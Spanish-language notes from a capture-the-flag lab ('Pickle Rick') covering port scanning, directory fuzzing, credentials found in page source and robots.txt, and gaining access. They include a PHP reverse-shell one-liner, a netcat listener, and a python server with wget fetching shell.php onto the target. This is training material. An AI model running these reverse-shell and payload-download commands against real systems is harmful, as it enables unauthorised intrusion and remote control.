# 27 - Pickle Rick

## Objetivos

## Procesos

### Escanear puertos

```
nmap <ip> -A -T4 -p <puertos_a_escanear> -oX <output.xml>
```

```
nmap 10.10.156.68 -A -T4 -p 22,80 -oX pickleR.xml
```

### Fuzzeo

```
feroxbuster -u <URL> -t <THREADS> -L <SCAN_LIMIT> -n <NO_RECURSION> -w <WORD_LIST> -o <OUTPUT>
```

```
feroxbuster -u http://10.10.156.68:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o feroxBPickleR.txt
```

### Pagina web

- Inspeccionar codigo

R1ckRul3s

- `/robots.txt`

Wubbalubbadubdub

#### `/portal.php`

Posible XSS

### Reverse Shell

Ver que la página esta hecha en PHP a traves de Wappalizer (extension) buscar reverse sheel en [internal all the things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php).

```
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

Cargar reverse shell:

1. Escuchar en un puerto

```
nc -nvlp 8085
```

2. Cargar script anterior en los comentarios de `/portal.php`:

3. Escalada de privilegios

4. Levantar servidor python:

   ```
   python3 -m http.server 80
   ```

5. Conectarme al servidor desde la máquina objetivo

   ```
   wget http://10.21.104.33/shell.php
   ```
